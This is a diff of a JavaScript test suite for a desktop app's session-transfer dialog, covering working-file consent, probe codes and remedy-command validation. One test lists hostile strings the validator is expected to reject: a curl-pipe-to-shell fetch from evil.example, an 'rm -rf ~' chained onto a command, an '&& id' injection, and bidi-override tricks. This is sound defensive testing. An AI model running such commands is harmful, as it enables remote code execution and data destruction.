@@ -82,6 +82,11 @@ const bundled = await build({
 		contents: `
 			export * from "./src/renderer/src/features/mesh/mesh-types";
 			export { MoveConfirmDialog } from "./src/renderer/src/features/mesh/mesh-actions";
+			export { reopenAsk } from "./src/renderer/src/features/mesh/mesh-drop";
+			export { partitionWorktrees, exclusionReason, probeDetailSentence, remedyDevice } from "./src/renderer/src/features/mesh/mesh-working-set";
+			export { ChatHeaderDevice } from "./src/renderer/src/features/chat/device/chat-header-device";
+			export { devicePickerModel } from "./src/renderer/src/features/chat/device/chat-device-model";
+			export { useChatDeviceStore } from "./src/renderer/src/features/chat/device/chat-device-store";
 			export { desktopEndpoint, desktopRequestSchema, desktopRequestDeadlineMs } from "./src/shared/desktop-contract";
 		`,
 		resolveDir: process.cwd(),
@@ -333,6 +338,12 @@ test("a consent refusal carries the fresh manifest and reopens; over_cap does no
 		refusalError("working_set_unconfirmed", { working_set: block() }),
 	);
 	assert.equal(api.workingSetReopen(unconfirmed).changed, false);
+	assert.equal(
+		api.workingSetReopen(unconfirmed).unconfirmed,
+		true,
+		"an unconfirmed reopen says why it came back (U2)",
+	);
+	assert.equal(api.workingSetReopen(changed).unconfirmed, false);
 	const overCap = api.meshRefusal(
 		refusalError("working_set_over_cap", { working_set: block() }),
 	);
@@ -346,6 +357,7 @@ test("a consent refusal carries the fresh manifest and reopens; over_cap does no
 	assert.deepEqual(unknown, {
 		workingSet: null,
 		changed: false,
+		unconfirmed: false,
 		withoutOnly: true,
 	});
 	const unsupported = api.workingSetReopen(
@@ -423,7 +435,11 @@ test("the preflight route and the consent body fields ride the wire only when se
 
 /* ---------------------------------------------------------------- the dialog */
 
-function installBridge({ features, preflight }) {
+/*
+ * `answer`, when given, replaces the preflight's 200: a function returning the
+ * desktop response (or a promise that never settles, for the loading state).
+ */
+function installBridge({ features, preflight, answer }) {
 	const calls = [];
 	window.api = {
 		desktop: {
@@ -442,12 +458,29 @@ function installBridge({ features, preflight }) {
 						},
 					};
 				if (request.op === "sessions.transfer.preflight")
-					return { status: 200, body: { result: preflight } };
+					return answer
+						? answer(request)
+						: { status: 200, body: { result: preflight } };
 				throw new Error(`unexpected op ${request.op}`);
 			},
 		},
 	};
 	return calls;
+}
+
+/*
+ * The review is three pinned/scrolling parts since the D1 layout fix (warning,
+ * details, consent), so "the review" a test reads is the dialog that holds them -
+ * asserted to actually carry the review, so a test can never pass on a dialog
+ * that rendered none of it.
+ */
+function reviewRoot() {
+	const dialog = document.querySelector('[role="dialog"]');
+	assert.ok(
+		dialog?.querySelector('[data-testid="working-set"]'),
+		"the dialog renders the working-set review",
+	);
+	return dialog;
 }
 
 async function settle() {
@@ -477,7 +510,7 @@ async function mount(props) {
 		defaultOptions: { queries: { retry: false } },
 	});
 	const chosen = [];
-	await act(async () => {
+	const render = (next) =>
 		root.render(
 			h(
 				QueryClientProvider,
@@ -489,13 +522,22 @@ async function mount(props) {
 					risky: false,
 					busy: false,
 					onCancel: () => {},
-					onChoose: (next) => chosen.push(next),
-					...props,
+					onChoose: (picked) => chosen.push(picked),
+					...next,
 				}),
 			),
 		);
-	});
+	await act(async () => render(props));
 	await settle();
+	/*
+	 * Re-render the SAME mounted dialog with new props, as both callers do
+	 * (they keep it mounted across openings): the reset logic under test only
+	 * exists for a dialog that is never remounted.
+	 */
+	const rerender = async (next) => {
+		await act(async () => render(next));
+		await settle();
+	};
 	const confirm = () =>
 		[...document.querySelectorAll('[role="dialog"] button')].find(
 			(button) => button.textContent === plan.verb,
@@ -507,7 +549,7 @@ async function mount(props) {
 		document.body.innerHTML = "";
 	};
 	mounted = unmount;
-	return { chosen, confirm };
+	return { chosen, confirm, rerender };
 }
 
 test("without the capability the dialog asks nothing and confirms as before", async () => {
@@ -535,7 +577,7 @@ test("with working files, Confirm waits for the tick and then sends the digest",
 	});
 	const view = await mount({});
 	assert.ok(calls.includes("sessions.transfer.preflight"));
-	const review = document.querySelector('[data-testid="working-set"]');
+	const review = reviewRoot();
 	assert.ok(review, "the populated review renders");
 	assert.match(review.textContent, /build-box/);
 	assert.match(review.textContent, /feat\/move-working-set/);
@@ -599,7 +641,7 @@ test("a changed-refusal seed renders the fresh list un-ticked, without a new pre
 	const view = await mount({ workingSetSeed: seed });
 	assert.equal(calls.includes("sessions.transfer.preflight"), false);
 	const box = document.querySelector(
-		'[data-testid="working-set"] [role="checkbox"]',
+		'[data-testid="working-set-consent"] [role="checkbox"]',
 	);
 	assert.equal(box.getAttribute("aria-checked"), "false");
 	assert.equal(view.confirm().disabled, true);
@@ -633,7 +675,7 @@ test("files that stay behind are said to stay, and the tick still sends the dige
 		},
 	});
 	const view = await mount({});
-	const review = document.querySelector('[data-testid="working-set"]');
+	const review = reviewRoot();
 	assert.equal(
 		review.querySelector("[data-mode]").getAttribute("data-mode"),
 		"leave",
@@ -670,16 +712,25 @@ test("an unknown working set offers only the explicit move-without consent", asy
 		plan: { ...plan, confirmWorkingSet: DIGEST },
 	});
 	assert.equal(calls.includes("sessions.transfer.preflight"), false);
-	const review = document.querySelector('[data-testid="working-set"]');
+	const review = reviewRoot();
 	assert.equal(
 		review.querySelector("[data-mode]").getAttribute("data-mode"),
 		"without",
 	);
 	assert.match(review.textContent, /couldn't be checked/);
 	assert.match(review.textContent, /build-box/);
-	assert.equal(view.confirm().disabled, true);
-	await act(async () => review.querySelector('[role="checkbox"]').click());
-	await act(async () => view.confirm().click());
+	const confirmWithout = () =>
+		[...document.querySelectorAll('[role="dialog"] button')].find(
+			(button) => button.textContent === "Move without working files",
+		);
+	assert.ok(confirmWithout(), "Confirm says it moves WITHOUT the files (U3)");
+	assert.equal(view.confirm(), undefined, "not the plain verb");
+	assert.equal(confirmWithout().disabled, true);
+	const box = document.querySelector(
+		'[data-testid="working-set-consent"] [role="checkbox"]',
+	);
+	await act(async () => box.click());
+	await act(async () => confirmWithout().click());
 	assert.equal(view.chosen[0].withoutWorkingSet, true);
 	assert.equal(
 		"confirmWorkingSet" in view.chosen[0],
@@ -713,7 +764,7 @@ function probedBlock(overrides = {}) {
 				remote_url: "git@github.com:o/r.git",
 				clone: undefined,
 				clone_check: "destination_cannot_fetch",
-				clone_detail: "git@github.com: Permission denied (publickey).",
+				clone_detail: "timeout",
 				https_rewrite: {
 					url: "https://github.com/o/r.git",
 					fetch: true,
@@ -741,10 +792,7 @@ test("the parser reads the probe's row and block answers, and malformed ones nev
 	const set = api.workingSet(probedBlock());
 	const [tree] = set.worktrees;
 	assert.equal(tree.cloneCheck, "destination_cannot_fetch");
-	assert.equal(
-		tree.cloneDetail,
-		"git@github.com: Permission denied (publickey).",
-	);
+	assert.equal(tree.cloneDetail, "timeout", "a fixed probe code is kept");
 	assert.deepEqual(tree.httpsRewrite, {
 		url: "https://github.com/o/r.git",
 		push: false,
@@ -752,6 +800,7 @@ test("the parser reads the probe's row and block answers, and malformed ones nev
 	assert.deepEqual(tree.remedy, {
 		runOn: "lending_device",
 		command: "lop network credential share github --with build-box",
+		kind: "share",
 	});
 	assert.deepEqual(tree.missingTools, ["node", "pnpm"]);
 	assert.deepEqual(set.source, {
@@ -798,17 +847,19 @@ test("with the probe, each row says whether the destination can reach its remote
 		preflight: { working_set: probedBlock() },
 	});
 	const view = await mount({});
-	const review = document.querySelector('[data-testid="working-set"]');
+	const review = reviewRoot();
 	const line = review.querySelector('[data-probe="destination_cannot_fetch"]');
 	assert.ok(line, "the failed row carries its reachability line");
 	assert.match(
 		line.textContent,
 		/build-box can't fetch git@github\.com:o\/r\.git/,
 	);
-	assert.match(
-		review.querySelector("[data-probe-detail]").textContent,
-		/Permission denied \(publickey\)/,
-		"git's own error line is shown under it",
+	const detail = review.querySelector("[data-probe-detail]");
+	assert.equal(detail.getAttribute("data-probe-detail"), "timeout");
+	assert.equal(
+		detail.textContent,
+		"The remote didn't answer in time.",
+		"the fixed code is said as a sentence, never as raw text (R2/D3)",
 	);
 	assert.match(
 		review.textContent,
@@ -825,15 +876,32 @@ test("with the probe, each row says whether the destination can reach its remote
 		),
 		"the remedy command is copyable",
 	);
-	assert.match(review.textContent, /Missing on build-box: node, pnpm/);
+	/*
+	 * D4: the tools are listed ONCE (the block note), the row does not repeat
+	 * them, and the advisory notes share one quiet info alert: the destination
+	 * warning is the review's only warning.
+	 */
+	assert.doesNotMatch(review.textContent, /Missing on build-box/);
 	const tools = review.querySelector('[data-probe="missing-tools"]');
-	assert.deepEqual(
-		[...tools.querySelectorAll("li")].map((li) => li.textContent),
-		["node", "pnpm"],
+	assert.match(tools.textContent, /node and pnpm|node, pnpm/);
+	assert.equal(
+		review.textContent.match(/pnpm/g).length,
+		1,
+		"pnpm is named once in the whole review",
 	);
 	assert.match(
 		review.querySelector('[data-probe="team-bridge"]').textContent,
 		/isn't enrolled in Team Bridge/,
+	);
+	const notes = review.querySelector('[data-probe="notes"]');
+	assert.ok(
+		notes.contains(tools) &&
+			notes.contains(review.querySelector('[data-probe="team-bridge"]')),
+	);
+	assert.equal(
+		review.querySelectorAll('[role="alert"][data-mode], [data-mode]').length,
+		1,
+		"one destination warning",
 	);
 	assert.equal(
 		review.querySelectorAll('[role="checkbox"]').length,
@@ -857,7 +925,7 @@ test("without the probe capability a probed block renders the review unchanged",
 		preflight: { working_set: probedBlock() },
 	});
 	await mount({});
-	const review = document.querySelector('[data-testid="working-set"]');
+	const review = reviewRoot();
 	assert.ok(review);
 	assert.equal(review.querySelector("[data-probe]"), null);
 	assert.equal(review.querySelector("[data-probe-remedy]"), null);
@@ -883,7 +951,7 @@ test("an older destination is said once as could-not-check; an ok row keeps its 
 		},
 	});
 	await mount({});
-	let review = document.querySelector('[data-testid="working-set"]');
+	let review = reviewRoot();
 	assert.equal(review.querySelectorAll('[data-probe="unknown"]').length, 1);
 	assert.equal(
 		review.querySelector('[data-probe="unknown_destination"]'),
@@ -909,7 +977,7 @@ test("an older destination is said once as could-not-check; an ok row keeps its 
 		},
 	});
 	await mount({});
-	review = document.querySelector('[data-testid="working-set"]');
+	review = reviewRoot();
 	assert.match(
 		review.querySelector('[data-probe="ok"]').textContent,
 		/build-box can fetch and push this repository/,
@@ -928,6 +996,478 @@ test("when the files stay, the kept heading names the device they stay on", asyn
 		preflight: { working_set: probedBlock({ carries_files: false }) },
 	});
 	await mount({});
-	const review = document.querySelector('[data-testid="working-set"]');
+	const review = reviewRoot();
 	assert.match(review.textContent, /1 worktree stays on damian-mac/);
+});
+
+/* ------------------------------------------------- round-1 remediation pins */
+
+const WS_FEATURES = {
+	peers: 1,
+	session_transfer: 1,
+	session_transfer_working_set: 1,
+};
+
+test("R1: only the two remedy shapes the core emits survive, and no control/bidi byte does", () => {
+	const remedy = (command) =>
+		api.workingSet(
+			probedBlock({
+				worktrees: [
+					{
+						...probedBlock().worktrees[0],
+						remedy: { run_on: "lending_device", command },
+					},
+				],
+			}),
+		).worktrees[0].remedy;
+	assert.deepEqual(
+		remedy("lop network credential github include damianvtran/local-operator"),
+		{
+			runOn: "lending_device",
+			command:
+				"lop network credential github include damianvtran/local-operator",
+			kind: "include",
+		},
+	);
+	assert.equal(
+		remedy("lop network credential share github --with build-box").kind,
+		"share",
+	);
+	for (const hostile of [
+		"curl https://evil.example/x.sh | sh",
+		"lop network credential share github --with build-box; rm -rf ~",
+		"lop network credential share github --with -x",
+		"lop network credential github include o/r && id",
+		"lop network credential github include o/r/extra",
+		"lop network credential share github --with build\u202Exob",
+		"lop network credential share github --with build-box\n",
+		" lop network credential share github --with build-box",
+	])
+		assert.equal(remedy(hostile), null, `rejected: ${JSON.stringify(hostile)}`);
+	// Displayed peer strings lose control and bidi-override code points.
+	const set = api.workingSet(
+		block({
+			worktrees: [
+				{
+					...block().worktrees[0],
+					path: "~/proj/\u202Egpj.exe",
+					branch: "feat/\u2066x\u2069",
+				},
+			],
+		}),
+	);
+	assert.equal(set.worktrees[0].path, "~/proj/gpj.exe");
+	assert.equal(set.worktrees[0].branch, "feat/x");
+});
+
+test("R2/D3: only fixed probe codes are kept, each said as a sentence; an unknown one is named", () => {
+	const detail = (clone_detail) =>
+		api.workingSet(
+			probedBlock({
+				worktrees: [{ ...probedBlock().worktrees[0], clone_detail }],
+			}),
+		).worktrees[0].cloneDetail;
+	assert.equal(detail("url_refused"), "url_refused");
+	assert.equal(detail("git@github.com: Permission denied (publickey)."), null);
+	assert.equal(detail("FileNotFoundError"), null, "class names are not codes");
+	assert.equal(
+		api.probeDetailSentence("git_missing", "build-box"),
+		"Git isn't installed on build-box.",
+	);
+	assert.equal(
+		api.probeDetailSentence("some_future_code", "build-box"),
+		"Reason reported by build-box: some_future_code.",
+	);
+});
+
+test("R5: only `planned` is promised as sent; an unknown exclusion names its code", () => {
+	const set = api.workingSet(
+		block({
+			worktrees: [
+				{ ...block().worktrees[0], state: "planned" },
+				{ ...block().worktrees[0], path: "~/b", state: "some_new_state" },
+				block().worktrees[1],
+			],
+		}),
+	);
+	const { sent, withheld } = api.partitionWorktrees(set);
+	assert.deepEqual(
+		sent.map((tree) => tree.path),
+		["~/local-operator/.worktrees/move-working-set"],
+	);
+	assert.deepEqual(
+		withheld.map((tree) => tree.path),
+		["~/b", "~/proj/.worktrees/secret-branch"],
+	);
+	assert.equal(api.exclusionReason("future_why"), "Not sent (future_why).");
+});
+
+test("R3: a tick never survives a close and reopen of the same mounted dialog", async () => {
+	installBridge({ features: WS_FEATURES, preflight: { working_set: block() } });
+	const view = await mount({});
+	const box = () =>
+		document.querySelector(
+			'[data-testid="working-set-consent"] [role="checkbox"]',
+		);
+	await act(async () => box().click());
+	assert.equal(box().getAttribute("aria-checked"), "true");
+	assert.equal(view.confirm().disabled, false);
+	await view.rerender({ open: false });
+	await view.rerender({ open: true });
+	assert.equal(
+		box().getAttribute("aria-checked"),
+		"false",
+		"same digest, new opening",
+	);
+	assert.equal(view.confirm().disabled, true);
+	// And a refusal reopen with a changed list, the path the reviewer named.
+	await act(async () => box().click());
+	await view.rerender({ open: false });
+	const seed = api.workingSetReopen(
+		api.meshRefusal(
+			refusalError("working_set_changed", {
+				working_set: block({ scope_digest: FRESH_DIGEST }),
+			}),
+		),
+	);
+	await view.rerender({ open: true, workingSetSeed: seed });
+	assert.equal(box().getAttribute("aria-checked"), "false");
+	assert.equal(view.confirm().disabled, true);
+	assert.ok(document.querySelector('[data-notice="changed"]'));
+});
+
+test("R4: loading keeps Confirm disabled; a failed read offers Check again and leaves Confirm usable", async () => {
+	/*
+	 * HELD, THEN RELEASED: a preflight that never settles leaves the desktop
+	 * transport's deadline timer alive, and the file then outlives its last
+	 * test by that deadline (measured: a run with one failing test sat past a
+	 * 50 s kill). Released in `finally` so a failing assertion cannot strand it.
+	 */
+	let release = () => {};
+	installBridge({
+		features: WS_FEATURES,
+		answer: () =>
+			new Promise((resolve) => {
+				release = () =>
+					resolve({ status: 200, body: { result: { working_set: block() } } });
+			}),
+	});
+	let view = await mount({});
+	try {
+		assert.match(
+			document.querySelector('[role="dialog"] [aria-live="polite"]')
+				.textContent,
+			/Checking which working files/,
+		);
+		assert.equal(view.confirm().disabled, true, "no confirming blind");
+	} finally {
+		release();
+		await settle();
+	}
+	await mounted();
+	mounted = null;
+	let asked = 0;
+	const calls = installBridge({
+		features: WS_FEATURES,
+		answer: () => {
+			asked += 1;
+			return asked === 1
+				? {
+						status: 503,
+						body: {
+							detail: { code: "peer_unreachable", message: "no answer" },
+						},
+					}
+				: { status: 200, body: { result: { working_set: block() } } };
+		},
+	});
+	view = await mount({});
+	assert.match(
+		document.querySelector('[role="dialog"]').textContent,
+		/Couldn't check/,
+	);
+	assert.equal(
+		view.confirm().disabled,
+		false,
+		"the route still guards the move",
+	);
+	const again = [...document.querySelectorAll('[role="dialog"] button')].find(
+		(button) => button.textContent === "Check again",
+	);
+	await act(async () => again.click());
+	await settle();
+	assert.equal(
+		calls.filter((op) => op === "sessions.transfer.preflight").length,
+		2,
+	);
+	assert.ok(reviewRoot(), "the retry renders the review");
+	assert.equal(view.confirm().disabled, true, "now it waits for the tick");
+});
+
+test("U8/N3: the checkbox is required and the dimmed Confirm says why", async () => {
+	installBridge({ features: WS_FEATURES, preflight: { working_set: block() } });
+	const view = await mount({});
+	const box = document.querySelector(
+		'[data-testid="working-set-consent"] [role="checkbox"]',
+	);
+	assert.equal(box.getAttribute("aria-required"), "true");
+	const described = view.confirm().getAttribute("aria-describedby");
+	assert.ok(described);
+	assert.match(
+		document.getElementById(described).textContent,
+		/I'm confident build-box should receive these files/,
+	);
+	await act(async () => box.click());
+	assert.equal(view.confirm().getAttribute("aria-describedby"), null);
+});
+
+test("D8/D6/U7: zero counts are omitted; files-stay mode says no 'move again' and no double negative", async () => {
+	installBridge({
+		features: WS_FEATURES,
+		preflight: {
+			working_set: block({
+				worktrees: [
+					{
+						...block().worktrees[0],
+						staged: 0,
+						untracked: 0,
+						clone: undefined,
+					},
+					block().worktrees[1],
+				],
+			}),
+		},
+	});
+	await mount({});
+	const text = reviewRoot().textContent;
+	assert.match(text, /3 unpushed commits · 2 unstaged/);
+	assert.doesNotMatch(text, /0 staged|0 untracked/);
+	await mounted();
+	mounted = null;
+	installBridge({
+		features: WS_FEATURES,
+		preflight: { working_set: block({ carries_files: false }) },
+	});
+	await mount({});
+	const stay = reviewRoot().textContent;
+	assert.match(
+		stay,
+		/This version of Local Operator doesn't move working files yet/,
+	);
+	assert.match(stay, /Left out even when working files move/);
+	assert.doesNotMatch(stay, /Withheld — not sent/);
+	assert.match(stay, /Unpushed history contains secret-shaped material\./);
+	assert.doesNotMatch(stay, /then move again/);
+});
+
+test("D6a: the pending-clone note names the destination device", async () => {
+	installBridge({
+		features: WS_FEATURES,
+		preflight: {
+			working_set: block({
+				worktrees: [
+					{
+						...block().worktrees[0],
+						clone: undefined,
+						clone_check: "pending_destination",
+						remote_url: "git@github.com:o/r.git",
+					},
+				],
+			}),
+		},
+	});
+	await mount({});
+	assert.match(
+		reviewRoot().textContent,
+		/If build-box doesn't have this repository, it's cloned from git@github\.com:o\/r\.git/,
+	);
+});
+
+test("D5: the consent never names an opaque device id", async () => {
+	installBridge({ features: WS_FEATURES, preflight: { working_set: block() } });
+	const seed = api.workingSetReopen(
+		api.meshRefusal(refusalError("working_set_unknown")),
+	);
+	await mount({ workingSetSeed: seed });
+	const text = reviewRoot().textContent;
+	assert.doesNotMatch(text, new RegExp(PEER));
+	assert.match(text, /the other device/);
+});
+
+test("U2: an unconfirmed reopen says why the dialog came back", async () => {
+	installBridge({ features: WS_FEATURES, preflight: { working_set: block() } });
+	const seed = api.workingSetReopen(
+		api.meshRefusal(
+			refusalError("working_set_unconfirmed", { working_set: block() }),
+		),
+	);
+	await mount({ workingSetSeed: seed });
+	assert.match(
+		document.querySelector('[data-notice="unconfirmed"]').textContent,
+		/Review the list, then confirm/,
+	);
+});
+
+test("U4: a consent reopen keeps the Move/Copy pair, the risk, and the user's pick", async () => {
+	const copy = { ...plan, keep: true, verb: "Copy to build-box" };
+	const asked = { plan, alternatives: [copy], risky: true };
+	const refused = { ...copy, confirmWorkingSet: DIGEST };
+	assert.deepEqual(api.reopenAsk(asked, refused, false), {
+		plan,
+		alternatives: [copy],
+		risky: true,
+		initialKeep: true,
+	});
+	// A different move falls back to the refused plan and the caller's risk.
+	assert.deepEqual(api.reopenAsk(asked, { ...refused, to: "local" }, true), {
+		plan: { ...refused, to: "local" },
+		alternatives: [],
+		risky: true,
+	});
+	installBridge({ features: WS_FEATURES, preflight: { working_set: block() } });
+	const seed = api.workingSetReopen(
+		api.meshRefusal(
+			refusalError("working_set_changed", { working_set: block() }),
+		),
+	);
+	await mount({
+		...api.reopenAsk(asked, refused, false),
+		workingSetSeed: seed,
+	});
+	const radios = [
+		...document.querySelectorAll('[role="dialog"] input[type="radio"]'),
+	];
+	assert.equal(radios.length, 2, "the Move/Copy choice is still offered");
+	assert.equal(
+		radios
+			.find((radio) => radio.checked)
+			.closest("label")
+			.textContent.includes("Copy to build-box"),
+		true,
+	);
+	assert.match(
+		document.querySelector('[role="dialog"]').textContent,
+		/open on the other end|open elsewhere/,
+	);
+});
+
+test("R4: the chat header reopens the dialog seeded when the store records a consent refusal", async () => {
+	const calls = installBridge({
+		features: WS_FEATURES,
+		preflight: { working_set: block() },
+	});
+	const host = document.createElement("div");
+	document.body.append(host);
+	const root = createRoot(host);
+	const client = new QueryClient({
+		defaultOptions: { queries: { retry: false } },
+	});
+	const model = api.devicePickerModel({
+		placement: { kind: "local" },
+		selfDeviceId: "",
+		selfName: "damian-mbp",
+		selfConversations: 1,
+		networks: [],
+		peers: [],
+		canTransfer: true,
+		meshRead: "ok",
+		busy: false,
+	});
+	await act(async () =>
+		root.render(
+			h(
+				QueryClientProvider,
+				{ client },
+				h(api.ChatHeaderDevice, {
+					placement: { kind: "local" },
+					model,
+					sessionId: plan.sessionId,
+					busy: false,
+					onPick: () => {},
+					onCheckAgain: () => {},
+				}),
+			),
+		),
+	);
+	mounted = async () => {
+		await act(async () => root.unmount());
+		host.remove();
+		client.clear();
+		document.body.innerHTML = "";
+	};
+	assert.equal(document.querySelector('[role="dialog"]'), null);
+	const refusal = api.meshRefusal(
+		refusalError("working_set_changed", {
+			working_set: block({ scope_digest: FRESH_DIGEST }),
+		}),
+	);
+	await act(async () =>
+		api.useChatDeviceStore.getState().refuseMove(plan.sessionId, {
+			refusal,
+			name: "build-box",
+			canWait: false,
+			plan: { ...plan, confirmWorkingSet: DIGEST },
+			to: PEER,
+			from: null,
+			keep: false,
+		}),
+	);
+	await settle();
+	assert.ok(reviewRoot(), "the dialog reopened with the review");
+	assert.ok(document.querySelector('[data-notice="changed"]'));
+	assert.equal(
+		calls.includes("sessions.transfer.preflight"),
+		false,
+		"seeded from the refusal, no new read",
+	);
+	assert.equal(
+		api.useChatDeviceStore.getState().moves[plan.sessionId],
+		undefined,
+		"the pane notice is dismissed in favour of the dialog",
+	);
+});
+
+test("the transfer receipt reads the core's engagement block, and only a real one", () => {
+	const base = { session_id: plan.sessionId, mode: "move", locality: "remote" };
+	assert.deepEqual(
+		api.transferReceipt({
+			...base,
+			engagement: { engaged: true, reason: "active", detail: "" },
+		}).engagement,
+		{ engaged: true, reason: "active" },
+	);
+	assert.equal(api.transferReceipt(base).engagement, null);
+	assert.equal(
+		api.transferReceipt({ ...base, engagement: { engaged: "yes" } }).engagement,
+		null,
+	);
+});
+
+test("the core's whole DETAIL_CODES list has its own sentence, and run_on names the lender when it can", () => {
+	// core #4241 @ ca98f378922f `network/workset_probe.py` DETAIL_CODES, in order.
+	for (const code of [
+		"auth_denied",
+		"not_found",
+		"unreachable",
+		"tls",
+		"host_key",
+		"timeout",
+		"host_refused",
+		"url_refused",
+		"git_missing",
+		"probe_error",
+		"error",
+	]) {
+		const sentence = api.probeDetailSentence(code, "build-box");
+		assert.doesNotMatch(sentence, /Reason reported by/, `${code} is mapped`);
+	}
+	assert.equal(api.remedyDevice("lending_device"), null);
+	assert.equal(api.remedyDevice(""), null);
+	assert.equal(api.remedyDevice("damian-mac"), "damian-mac");
+	assert.equal(
+		api.remedyDevice("Damian's MacBook Pro"),
+		"Damian's MacBook Pro",
+	);
+	assert.equal(api.remedyDevice("x\u202Ey"), null);
+	assert.equal(api.remedyDevice("<b>x</b>"), null);
 });
